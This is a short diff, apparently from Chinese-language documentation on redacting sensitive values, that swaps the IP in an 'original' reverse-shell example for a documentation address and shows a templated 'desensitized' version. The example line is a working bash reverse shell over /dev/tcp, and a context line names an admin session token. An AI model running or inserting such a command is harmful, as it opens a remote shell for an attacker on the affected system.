@@ -110,7 +110,7 @@ admin_token = "{admin_session_token}"  # eyJhbGciOi...
 
 ```bash
 # 原始
-bash -c 'bash -i >& /dev/tcp/45.32.10.5/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'
 
 # 脱敏
 bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
